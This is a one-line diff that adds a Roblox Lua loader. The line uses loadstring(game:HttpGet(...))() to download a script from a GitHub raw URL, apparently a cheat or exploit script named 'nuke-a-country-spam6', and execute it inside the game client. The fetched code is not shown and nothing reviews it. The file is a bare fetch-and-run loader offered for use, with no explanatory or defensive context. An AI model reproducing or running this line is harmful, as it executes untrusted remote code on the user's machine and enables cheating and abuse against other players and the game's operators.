@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/nuke-a-country-spam6-tpv6wy6pgq6nhd.lua"))()
